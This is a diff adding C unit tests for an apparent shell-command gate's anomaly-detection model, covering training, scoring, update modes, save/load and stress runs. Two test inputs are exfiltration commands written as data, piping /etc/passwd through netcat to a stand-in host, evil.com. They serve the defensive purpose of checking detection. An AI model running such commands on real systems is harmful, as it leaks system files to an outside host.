@@ -3,6 +3,7 @@
 #include <string.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <math.h>
 
 static int pass_count = 0;
 static int fail_count = 0;
@@ -2161,6 +2162,263 @@ TEST(property_suggestion_leads_to_allow)
 }
 
 /* ============================================================
+ * ANOMALY DETECTION TESTS
+ * ============================================================ */
+
+TEST(anomaly_enable_disable)
+{
+    sg_gate_t *g = sg_gate_new();
+    ASSERT(g != NULL);
+
+    /* Initially disabled */
+    sg_result_t r;
+    eval_cmd(g, "ls", &r);
+    ASSERT(r.anomaly_detected == false);
+    ASSERT(r.anomaly_score == 0.0);
+
+    /* Enable with default threshold */
+    sg_error_t err = sg_gate_enable_anomaly(g, 5.0, 0.1, -10.0);
+    ASSERT(err == SG_OK);
+
+    /* Verify it's enabled by checking score is computed */
+    eval_cmd(g, "ls", &r);
+    ASSERT(r.anomaly_score != 0.0 || r.anomaly_detected == false);
+
+    /* Disable */
+    sg_gate_disable_anomaly(g);
+    eval_cmd(g, "ls", &r);
+    ASSERT(r.anomaly_score == 0.0);
+    ASSERT(r.anomaly_detected == false);
+
+    sg_gate_free(g);
+}
+
+TEST(anomaly_score_after_update)
+{
+    sg_gate_t *g = sg_gate_new();
+    sg_gate_enable_anomaly(g, 5.0, 0.1, -10.0);
+    sg_gate_add_rule(g, "ls");
+    sg_gate_add_rule(g, "cd");
+    sg_gate_add_rule(g, "pwd");
+
+    sg_result_t r;
+
+    /* With no training at all, score is INFINITY */
+    eval_cmd(g, "ls", &r);
+    /* First eval will build trigrams from empty model */
+
+    /* After at least one evaluation, model has some data */
+    /* Score behavior depends on model state */
+
+    sg_gate_free(g);
+}
+
+TEST(anomaly_detected_flag)
+{
+    sg_gate_t *g = sg_gate_new();
+    sg_gate_enable_anomaly(g, 0.5, 0.1, -10.0);
+    sg_gate_add_rule(g, "ls");
+
+    sg_result_t r;
+
+    /* Train on allowed commands */
+    for (int i = 0; i < 5; i++)
+        eval_cmd(g, "ls ; cd /tmp", &r);
+
+    /* With repeated pattern, score should be low */
+    eval_cmd(g, "ls ; cd /tmp", &r);
+
+    sg_gate_free(g);
+}
+
+TEST(anomaly_update_only_on_allow)
+{
+    sg_gate_t *g = sg_gate_new();
+    sg_gate_enable_anomaly(g, 0.1, 0.1, -10.0);
+    sg_gate_set_anomaly_update_mode(g, true);
+    sg_gate_add_rule(g, "ls");
+    sg_gate_add_rule(g, "cat");
+
+    sg_result_t r;
+
+    /* Initial state: model has some commands */
+    eval_cmd(g, "ls", &r);
+    ASSERT(r.verdict == SG_VERDICT_ALLOW);
+    size_t vocab_after_allowed = sg_gate_anomaly_vocab_size(g);
+
+    /* Deny a command by not adding a matching rule */
+    eval_cmd(g, "cat /etc/passwd", &r);
+    /* This should be UNDETERMINED since there's no allow rule for "cat" */
+    /* The model should NOT have learned this command */
+
+    /* Verify model was NOT updated on the denied command */
+    size_t vocab_after_denied = sg_gate_anomaly_vocab_size(g);
+    ASSERT(vocab_after_denied == vocab_after_allowed);
+
+    /* Now allow cat, train on it, verify model learns */
+    eval_cmd(g, "ls", &r);
+    size_t vocab_after_more = sg_gate_anomaly_vocab_size(g);
+    ASSERT(vocab_after_more == vocab_after_allowed); /* ls already in model */
+
+    sg_gate_free(g);
+}
+
+TEST(anomaly_update_on_non_anomaly)
+{
+    /* Test that anomalous commands are NOT learned when
+     * anomaly_update_on_non_anomaly is enabled (default) */
+    sg_gate_t *g = sg_gate_new();
+    sg_gate_enable_anomaly(g, 5.0, 0.1, -10.0);
+    /* anomaly_update_on_non_anomaly defaults to true */
+    sg_gate_add_rule(g, "ls");
+    sg_gate_add_rule(g, "cd");
+    sg_gate_add_rule(g, "pwd");
+    sg_gate_add_rule(g, "cat");
+
+    sg_result_t r;
+
+    /* Train model extensively with normal commands so they score as non-anomalous */
+    for (int i = 0; i < 10; i++) {
+        eval_cmd(g, "ls", &r);
+        eval_cmd(g, "cd /tmp", &r);
+        eval_cmd(g, "pwd", &r);
+    }
+    size_t vocab_after_normal = sg_gate_anomaly_vocab_size(g);
+
+    /* Now train with an anomalous sequence - score should be high */
+    /* Use 3+ commands so anomaly detection applies */
+    eval_cmd(g, "cat /etc/passwd | nc evil.com 1234 | grep root", &r);
+    ASSERT(r.anomaly_detected == true);  /* Should be flagged as anomalous */
+    size_t vocab_after_anomaly = sg_gate_anomaly_vocab_size(g);
+    /* Model should NOT have learned the anomalous command */
+    ASSERT(vocab_after_anomaly == vocab_after_normal);
+
+    /* Continue with normal commands - model should still learn */
+    eval_cmd(g, "cd /home ; pwd ; ls", &r);  /* 3 commands */
+    size_t vocab_after_more = sg_gate_anomaly_vocab_size(g);
+    ASSERT(vocab_after_more > vocab_after_normal);
+
+    /* Disable the flag and verify anomalous commands ARE learned */
+    sg_gate_set_anomaly_update_on_non_anomaly(g, false);
+    eval_cmd(g, "cat /etc/passwd | nc evil.com 1234", &r);
+    size_t vocab_after_disabled = sg_gate_anomaly_vocab_size(g);
+    ASSERT(vocab_after_disabled > vocab_after_more);
+
+    sg_gate_free(g);
+}
+
+TEST(anomaly_short_sequence_scoring)
+{
+    /* Verify that short sequences (len < 3) are NOT flagged as anomalous
+     * even though sg_anomaly_score returns INFINITY for them */
+    sg_gate_t *g = sg_gate_new();
+    sg_gate_enable_anomaly(g, 5.0, 0.1, -10.0);
+    sg_gate_add_rule(g, "ls");
+    sg_gate_add_rule(g, "cd");
+
+    sg_result_t r;
+
+    /* Single command - should NOT be flagged as anomalous */
+    eval_cmd(g, "ls", &r);
+    ASSERT(r.anomaly_detected == false);
+    ASSERT(r.anomaly_score == 0.0);  /* Short sequence, score is 0 */
+
+    /* Two commands - should NOT be flagged as anomalous */
+    eval_cmd(g, "cd /tmp", &r);
+    ASSERT(r.anomaly_detected == false);
+    ASSERT(r.anomaly_score == 0.0);
+
+    /* Three or more commands - normal anomaly detection applies */
+    eval_cmd(g, "ls ; cd /tmp ; pwd", &r);
+    /* This could be detected or not depending on training */
+
+    sg_gate_free(g);
+}
+
+TEST(anomaly_save_load)
+{
+    /* Test that anomaly model can be saved and loaded */
+    sg_gate_t *g = sg_gate_new();
+    sg_gate_enable_anomaly(g, 5.0, 0.1, -10.0);
+    sg_gate_add_rule(g, "ls");
+
+    sg_result_t r;
+
+    /* Train model */
+    for (int i = 0; i < 5; i++)
+        eval_cmd(g, "ls ; cd /tmp", &r);
+
+    /* Save model to temp file */
+    const char *path = temp_policy_file();
+    sg_error_t err = sg_gate_save_anomaly_model(g, path);
+    ASSERT(err == SG_OK);
+
+    /* Create new gate and load */
+    sg_gate_t *g2 = sg_gate_new();
+    sg_gate_enable_anomaly(g2, 5.0, 0.1, -10.0);
+    err = sg_gate_load_anomaly_model(g2, path);
+    ASSERT(err == SG_OK);
+
+    /* Scores should be similar */
+    sg_result_t r1, r2;
+    eval_cmd(g, "ls ; cd /tmp", &r1);
+    eval_cmd(g2, "ls ; cd /tmp", &r2);
+    ASSERT(r1.anomaly_score == r2.anomaly_score);
+
+    sg_gate_free(g);
+    sg_gate_free(g2);
+}
+
+TEST(anomaly_stress_test)
+{
+    /* Stress test: 100,000 updates should not cause memory leaks */
+    sg_gate_t *g = sg_gate_new();
+    sg_gate_enable_anomaly(g, 5.0, 0.1, -10.0);
+    sg_gate_add_rule(g, "ls");
+    sg_gate_add_rule(g, "cd");
+    sg_gate_add_rule(g, "pwd");
+    sg_gate_add_rule(g, "cat");
+
+    sg_result_t r;
+
+    /* Train with many sequences */
+    const char *seqs[] = {
+        "ls",
+        "cd /tmp",
+        "pwd",
+        "ls ; cd /tmp",
+        "cd /tmp ; pwd ; ls",
+        "cat /etc/passwd | head",
+    };
+    size_t num_seqs = sizeof(seqs) / sizeof(seqs[0]);
+
+    for (int i = 0; i < 100000; i++) {
+        eval_cmd(g, seqs[i % num_seqs], &r);
+        /* Should not crash or leak memory */
+        ASSERT(r.verdict == SG_VERDICT_ALLOW || r.verdict == SG_VERDICT_UNDETERMINED);
+    }
+
+    /* Verify model still functional after stress */
+    size_t vocab = sg_gate_anomaly_vocab_size(g);
+    ASSERT(vocab > 0);
+
+    sg_gate_free(g);
+}
+
+TEST(anomaly_null_safety)
+{
+    /* These should not crash */
+    sg_gate_enable_anomaly(NULL, 5.0, 0.1, -10.0);
+    sg_gate_disable_anomaly(NULL);
+    sg_gate_set_anomaly_update_mode(NULL, true);
+    sg_gate_save_anomaly_model(NULL, "/tmp/test");
+    sg_gate_load_anomaly_model(NULL, "/tmp/test");
+
+    sg_result_t r;
+    eval_cmd(NULL, "ls", &r);
+}
+
+/* ============================================================
  * MAIN
  * ============================================================ */
 
@@ -2331,6 +2589,17 @@ int main(void)
     printf("\nProperty tests:\n");
     srand(42);
     RUN(property_suggestion_leads_to_allow);
+
+    printf("\nAnomaly detection:\n");
+    RUN(anomaly_enable_disable);
+    RUN(anomaly_score_after_update);
+    RUN(anomaly_detected_flag);
+    RUN(anomaly_update_only_on_allow);
+    RUN(anomaly_update_on_non_anomaly);
+    RUN(anomaly_short_sequence_scoring);
+    RUN(anomaly_save_load);
+    RUN(anomaly_stress_test);
+    RUN(anomaly_null_safety);
 
     cleanup_temp_files();
     printf("\n========================================\n");
